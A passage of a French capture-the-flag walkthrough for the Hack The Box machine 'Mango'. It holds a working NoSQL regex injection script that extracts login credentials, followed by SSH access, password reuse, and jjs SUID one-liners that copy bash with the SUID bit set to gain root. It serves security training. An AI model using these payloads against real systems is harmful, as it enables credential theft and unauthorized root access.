characters = string.ascii_letters + string.digits + string.punctuation


def valid(data):
    response = requests.post(
        url,
        data=data,
        allow_redirects=False
    )

    return response.status_code == 302


def extract_username(first_character):
    username = first_character

    while True:
        found = False

        for character in characters:
            candidate = username + character
            regex_candidate = re.escape(candidate)

            data = {
                "username[$regex]": f"^{regex_candidate}",
                "password[$regex]": ".*",
                "login": "login"
            }

            if valid(data):
                username = candidate
                print(f"[+] Username: {username}")
                found = True
                break

        if not found:
            return username


def extract_password(username):
    password = ""

    while True:
        found = False

        for character in characters:
            candidate = password + character
            regex_candidate = re.escape(candidate)

            data = {
                "username": username,
                "password[$regex]": f"^{regex_candidate}",
                "login": "login"
            }

            if valid(data):
                password = candidate
                print(f"[+] {username} password: {password}")
                found = True
                break

        if not found:
            return password


users = []

for character in characters:
    regex_character = re.escape(character)

    data = {
        "username[$regex]": f"^{regex_character}",
        "password[$regex]": ".*",
        "login": "login"
    }

    if valid(data):
        username = extract_username(character)

        if username not in users:
            users.append(username)

results = []

for username in users:
    password = extract_password(username)
    results.append((username, password))
    print(f"[+] {username}:{password}")

print()
print("+----------+------------------+")
print("| Username | Password         |")
print("+----------+------------------+")

for username, password in results:
    print(f"| {username:<8} | {password:<16} |")

print("+----------+------------------+")
```

La fonction `valid()` envoie la requête sans suivre automatiquement les redirections. Une réponse `302` peut ainsi être utilisée directement comme indicateur qu’un préfixe correspond.

La liste `characters` contient les lettres, les chiffres et les caractères de ponctuation. Certains de ces caractères, comme `.`, `*`, `?`, `[` ou `]`, ont toutefois une signification particulière dans une expression régulière.

Pour éviter qu’ils soient interprétés comme des opérateurs regex, le script utilise :

```
re.escape()
```

Par exemple, un point `.` sera ainsi recherché comme un véritable point et non comme le caractère spécial regex signifiant « n’importe quel caractère ».

La première boucle teste les différents caractères possibles au début de `username`. Lorsqu’un caractère provoque une réponse `302`, `extract_username()` poursuit la recherche caractère par caractère jusqu’à ce qu’aucun caractère supplémentaire ne corresponde.

Le même principe est ensuite appliqué par `extract_password()`, cette fois en conservant le nom d’utilisateur trouvé et en faisant varier le préfixe du mot de passe.

Le script affiche progressivement les caractères découverts, ce qui permet de suivre l’extraction pendant son exécution.

#### Résultats

```bash
python3 nosqli_extract.py
```

L’exécution du script te donne :

```txt
[+] Username: ad
[+] Username: adm
[+] Username: admi
[+] Username: admin
[+] Username: ma
[+] Username: man
[+] Username: mang
[+] Username: mango
[+] admin password: t
[+] admin password: t9
[+] admin password: t9K
[+] admin password: t9Kc
[+] admin password: t9KcS
[+] admin password: t9KcS3
[+] admin password: t9KcS3>
[+] admin password: t9KcS3>!
[+] admin password: t9KcS3>!0
[+] admin password: t9KcS3>!0B
[+] admin password: t9KcS3>!0B#
[+] admin password: t9KcS3>!0B#2
[+] admin:t9KcS3>!0B#2
[+] mango password: h
[+] mango password: h3
[+] mango password: h3m
[+] mango password: h3mX
[+] mango password: h3mXK
[+] mango password: h3mXK8
[+] mango password: h3mXK8R
[+] mango password: h3mXK8Rh
[+] mango password: h3mXK8RhU
[+] mango password: h3mXK8RhU~
[+] mango password: h3mXK8RhU~f
[+] mango password: h3mXK8RhU~f{
[+] mango password: h3mXK8RhU~f{]
[+] mango password: h3mXK8RhU~f{]f
[+] mango password: h3mXK8RhU~f{]f5
[+] mango password: h3mXK8RhU~f{]f5H
[+] mango:h3mXK8RhU~f{]f5H

+----------+------------------+
| Username | Password         |
+----------+------------------+
| admin    | t9KcS3>!0B#2     |
| mango    | h3mXK8RhU~f{]f5H |
+----------+------------------+
```

L’exécution du script te permet d’identifier progressivement deux noms d’utilisateur :

```text
admin
mango
```

Le script extrait ensuite le mot de passe associé à chacun d’eux, caractère par caractère.

Les identifiants obtenus sont :

```
admin:t9KcS3>!0B#2
mango:h3mXK8RhU~f{]f5H
```



Tu confirmes ainsi que la vulnérabilité NoSQL permet non seulement de contourner le formulaire d’authentification, mais également de récupérer les identifiants stockés par l’application.

Ces comptes peuvent maintenant être testés sur les autres services exposés par la machine, notamment SSH sur le port `22`.

### Connexion SSH

Une première tentative avec le compte `admin` échoue :

```bash
ssh admin@mango.htb
```

Tu peux alors essayer le second compte découvert :

```
ssh mango@mango.htb
```

Cette fois, l’authentification fonctionne avec le mot de passe récupéré précédemment.

Une fois connecté, tu peux rechercher le fichier `user.txt` :

```bash
find / -name user.txt 2>/dev/null
```

Le fichier se trouve dans :

```
/home/admin/user.txt
```

Le compte `mango` peut accéder au répertoire personnel de `admin`, mais il ne peut pas lire directement le fichier `user.txt`.

```bash
ls -la /home/admin
```

donne :

```bash
drwxr-xr-x 2 admin admin 4096 Oct 23  2023 .
drwxr-xr-x 4 root  root  4096 Oct 23  2023 ..
lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
-r-------- 1 admin admin   33 Aug 29 15:04 user.txt
```

Les permissions `-r--------` indiquent que seul l’utilisateur `admin` peut lire `user.txt`.

Pour y accéder, tu peux alors vérifier si le mot de passe extrait pour l’utilisateur `admin` de l’application web est également utilisé par le compte système `admin` :

```bash
su admin
```

L’authentification réussit et tu bascules sur le compte `admin`.

La session obtenue utilise un shell `sh` :

```sh
$ echo $0
sh
```

Pour bénéficier d’un environnement plus confortable, lance :

```sh
bash
```

### Lecture de `user.txt`

Tu peux ensuite lire le flag utilisateur :

```bash
admin@mango:/home/mango$ cat /home/admin/user.txt
4bb2xxxxxxxxxxxxxxxxxxxxxxxxxxxbe57
```

## Escalade de privilèges

{{< escalade-intro-v2 user="admin" >}}

### Vérification sudo

Commence par vérifier si le compte `admin` dispose de droits particuliers via `sudo` :

```bash
sudo -l
```

Le système te demande le mot de passe du compte, puis indique qu’aucune commande ne peut être exécutée avec `sudo` :

```bash
[sudo] password for admin:
Sorry, user admin may not run sudo on mango.
```

Cette piste ne permet donc pas d’obtenir davantage de privilèges.

### Capabilities

Tu peux ensuite rechercher les fichiers disposant de capabilities particulières :

```bash
getcap -r / 2>/dev/null
```

Un seul résultat apparaît :

```bash
/usr/bin/mtr-packet = cap_net_raw+ep
```

La capability `cap_net_raw` permet notamment à `mtr-packet` d’utiliser des sockets réseau bruts sans devoir être exécuté directement en tant que `root`.

Dans ce cas, cette capability n’offre pas de moyen évident d’obtenir des privilèges supplémentaires.

Il faut donc poursuivre l’énumération avec la recherche des binaires SUID.

### SUID

Pour faciliter la recherche des binaires SUID, utilise `suid3num.py`.

Depuis Kali, place-toi dans le répertoire contenant le script et démarre un petit serveur HTTP, comme décrit dans la recette {{< recette "copier-fichiers-kali" >}} :

```bash
python3 -m http.server 8000
```

Depuis la machine cible, télécharge ensuite `suid3num.py` dans `/dev/shm` :

```bash
cd /dev/shm
wget http://10.10.x.x:8000/suid3num.py
```

Puis exécute le script :

```bash
python3 suid3num.py
```

Parmi les résultats, `suid3num.py` signale deux binaires comme particulièrement intéressants :

```bash
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/run-mailcap
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
------------------------------
```

Le script indique également que `jjs` figure dans la liste GTFOBins :

```bash
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -~> https://gtfobins.github.io/gtfobins/jjs/#suid
------------------------------
```

Enfin, `suid3num.py` propose directement une commande d’exploitation :

```text
[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Jjs ( /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs )
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Il serait tentant de copier cette commande telle quelle et de l’exécuter immédiatement.

Ici, son exécution ne te fournit cependant pas de shell exploitable et laisse le terminal bloqué.

Ce comportement est probablement lié au contexte de ta session : tu es déjà passé par plusieurs couches de shell, depuis la connexion SSH avec le compte `mango`, puis un `su admin`. La commande proposée tente encore d’ouvrir un shell privilégié tout en redirigeant ses entrées et sorties vers le terminal courant. Cet empilement de shells et de redirections peut perturber la gestion du TTY.

La commande est relativement complexe : elle lance plusieurs shells, utilise l’option `-p` pour conserver les privilèges effectifs et manipule directement les entrées et sorties du terminal avec `tty`.

Plutôt que de poursuivre avec cette commande complexe, tu vas d’abord vérifier de manière simple et contrôlée comment `jjs` permet d’exécuter des commandes avec les privilèges effectifs de `root`.

### Exploitation du SUID

Commence par vérifier directement les permissions de `jjs` :

```bash
ls -l /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Le résultat confirme que le binaire appartient à `root` et possède bien le bit SUID :

```text
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Le `s` présent dans les permissions du propriétaire confirme que le bit SUID est actif. Le binaire possède également le bit SGID pour le groupe `admin`.

Le principe est important à comprendre : lorsqu’un programme SUID appartenant à `root` est exécuté, il peut fonctionner avec les privilèges effectifs de `root`, même s’il est lancé depuis le compte `admin`.


Ici, `jjs` est particulièrement intéressant. 

La construction utilisée par `suid3num.py` repose notamment sur :

```javascript
Java.type('java.lang.Runtime').getRuntime().exec(...)
```

Ce code montre que `jjs` permet d’accéder aux classes Java depuis JavaScript, notamment à `java.lang.Runtime`, dont la méthode `exec()` peut lancer des commandes système.

Pour observer ce comportement, tu peux commencer par demander directement à `jjs` d’exécuter `id` :

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Le résultat obtenu est :

```text
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")
Process[pid=2059, exitValue="not exited"]
jjs>
```

La commande `id` a bien été lancée, mais son résultat n’apparaît pas dans le terminal.

À la place, `jjs` affiche simplement une information indiquant qu’un nouveau processus a été démarré.

La sortie standard de ce processus n’est pas automatiquement reliée à celle de `jjs`, et donc à ton terminal.

`Runtime.exec()` suffit donc à lancer une commande, mais il ne relie pas automatiquement sa sortie à ton terminal.

Pour récupérer plus simplement les entrées et sorties du processus lancé, tu peux utiliser une autre classe Java : `ProcessBuilder`.

Avec sa méthode `inheritIO()`, le processus hérite directement de l’entrée standard, de la sortie standard et de la sortie d’erreur du terminal courant.

Tu peux alors demander à `jjs` de lancer Bash puis d’exécuter `id` :

```bash
echo 'new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start().waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

La partie :

```bash
/bin/bash -p -c id
```

signifie simplement :

- lancer Bash ;
- conserver les privilèges effectifs avec l’option `-p` ;
- exécuter la commande `id` avec `-c`.

L’option `-p` est importante ici. Le processus lancé possède un UID réel correspondant à `admin`, mais un UID effectif égal à `0` grâce au bit SUID de `jjs`.

Sans cette option, Bash peut abandonner ces privilèges élevés. Avec `-p`, il conserve l’UID effectif de `root`.

Le résultat obtenu est :

```text
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start().waitFor()
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
0
jjs>
```

La partie importante est :

```text
euid=0(root)
```

Ton UID réel reste celui du compte `admin`, mais l’UID effectif du processus est désormais celui de `root`.

La méthode `start()` lance le processus, tandis que `waitFor()` attend sa fin et renvoie son code de retour.

Le `0` affiché juste après correspond au code de retour renvoyé par `waitFor()` : il indique que la commande s’est terminée correctement.

Ce test confirme donc que `jjs` permet bien d’exécuter une commande avec les privilèges effectifs de `root`.

### Root shell

Il reste maintenant à transformer cette possibilité en un shell privilégié pratique à utiliser.

Deux voies s’imposent naturellement à ce stade :

- lancer un reverse shell privilégié vers Kali ;
- créer une copie de Bash capable de conserver les privilèges de `root` avec l’option `-p`.

Comme tu disposes déjà d’un accès interactif à la machine cible, il est plus simple de rester en local. Cela évite de lancer un listener sur Kali, d’ouvrir une nouvelle connexion réseau et d’ajouter une session supplémentaire à gérer.

Tu vas donc utiliser la seconde méthode.

#### Root shell dans `/dev/shm`

Tu travailles déjà dans `/dev/shm`, un emplacement accessible en écriture par le compte `admin`. C’est donc un candidat naturel pour créer une copie de Bash et vérifier si le bit SUID peut y être exploité.

L’idée est d’y créer une copie de Bash appartenant à `root`, puis de lui attribuer le bit SUID afin de pouvoir conserver les privilèges effectifs de `root` lors de son exécution avec l’option `-p`.

Grâce à `jjs`, tu peux d’abord copier `/bin/bash` :

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/cp /bin/bash /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Tu peux ensuite attribuer le bit SUID à cette copie :

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

La valeur `4755` correspond aux permissions classiques `755`, auxquelles s’ajoute le bit SUID représenté par le premier chiffre `4`.

Ici, tu n’as pas besoin d’interagir avec la sortie des commandes : il suffit de lancer `cp` puis `chmod`. `Runtime.exec()` convient donc parfaitement pour ces opérations simples.

Vérifie alors les permissions du fichier :

```bash
ls -l /dev/shm/rootbash
```

La présence du `s` dans les permissions confirme que le bit SUID a bien été appliqué.

Lance maintenant la copie de Bash avec l’option `-p` :

```bash
/dev/shm/rootbash -p
```

Cette fois, le résultat n’est pas celui attendu : malgré la présence du bit SUID, l’exécution de `/dev/shm/rootbash -p` ne donne pas un shell avec `euid=0(root)`.

La copie de Bash existe bien et son bit SUID est présent. Le comportement observé semble donc lié à une propriété du système de fichiers ou du point de montage utilisé.

Vérifie alors les options de montage de `/dev/shm` :

```bash
mount | grep '/dev/shm'
```

Le résultat est sans ambiguïté :

```text
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
```

L’option :

```text
nosuid
```

indique que les bits SUID et SGID ne sont pas pris en compte lors de l’exécution de fichiers situés sur ce point de montage.

C’est donc cette option qui empêche `/dev/shm/rootbash` d’obtenir les privilèges effectifs de `root`, malgré son bit SUID.

#### Root shell dans `/tmp`

Comme `/dev/shm` est monté avec l’option `nosuid`, il faut maintenant tester un autre emplacement accessible en écriture où le bit SUID pourra être pris en compte.

Tu peux reprendre la même méthode avec `/tmp`.

Commence par demander à `jjs` de copier `/bin/bash` vers `/tmp/rootbash` :

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/cp /bin/bash /tmp/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Le code de retour `0` indique que la copie s’est correctement déroulée.

Attribue ensuite le bit SUID à cette copie :

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /tmp/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Vérifie ensuite les permissions du fichier :

```bash
ls -l /tmp/rootbash
```

Le résultat est :

```text
-rwsr-xr-x 1 root admin 1113504 Sep  7 09:30 /tmp/rootbash
```

Le propriétaire du fichier est bien `root`, et le `s` dans ses permissions confirme que le bit SUID est actif.

Le groupe du fichier reste `admin`, mais cela n’a pas d’incidence sur l’exploitation du bit SUID : celui-ci utilise l’identité du propriétaire du fichier, ici `root`.

Tu peux maintenant lancer cette copie avec l’option `-p` :

```bash
/tmp/rootbash -p
```

Le prompt change :

```text
rootbash-4.4#
```

Le nom `rootbash` et le caractère `#` sont encourageants, mais ils ne suffisent pas à confirmer que le shell dispose réellement des privilèges de `root`.

Il vaut donc mieux les vérifier avec :

```bash
id
```

Le résultat est :

```text
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
```

Ton UID réel reste celui du compte `admin`, mais l’UID effectif est désormais celui de `root`.

Avec `euid=0(root)`, tu disposes maintenant d’un shell privilégié.

### root.txt

Une fois le shell privilégié obtenu, il ne te reste plus qu’à récupérer le flag final :

```bash
cat /root/root.txt
```

Le contenu du fichier confirme que le shell dispose bien des privilèges nécessaires pour accéder aux fichiers réservés à `root` :

```text
722cxxxxxxxxxxxxxxxxxxxxxxxxxxxc5ec
```

Cette étape termine l’escalade de privilèges.

## Conclusion

Mango propose une chaîne d’attaque assez progressive, dans laquelle chaque étape apporte une information utile pour la suivante.

L’énumération met d’abord en évidence une surface d’attaque limitée, mais l’analyse du certificat TLS révèle le nom d’hôte `staging-order.mango.htb`. L’application accessible sur ce VirtualHost présente un formulaire d’authentification vulnérable à une injection NoSQL.

L’utilisation des opérateurs `$ne` puis `$regex` permet d’abord de confirmer la vulnérabilité, avant d’exploiter les différences entre les réponses `200 OK` et `302 Found` pour extraire progressivement les noms d’utilisateur et leurs mots de passe.

Ces identifiants permettent ensuite d’obtenir un accès SSH avec le compte `mango`, puis de réutiliser le mot de passe extrait pour `admin` afin de passer au compte système `admin` et de récupérer `user.txt`.

L’escalade de privilèges repose enfin sur le binaire `jjs`, présent avec le bit SUID. Son accès aux classes Java permet d’exécuter des commandes avec un UID effectif égal à `0` (`root`). La tentative initiale dans `/dev/shm` montre toutefois qu’un bit SUID ne suffit pas toujours : l’option de montage `nosuid` empêche son utilisation. En reproduisant la même méthode dans `/tmp`, il devient possible de lancer une copie SUID de Bash avec `-p`, d’obtenir un shell privilégié et de lire `root.txt`.

Mango permet ainsi de travailler plusieurs points importants : l’analyse des VirtualHosts, les injections NoSQL, l’extraction d’identifiants à partir des différences de réponse HTTP, la réutilisation de mots de passe, l’exploitation d’un binaire SUID et l’impact concret des options de montage Linux sur une escalade de privilèges.

---

{{< feedback >}}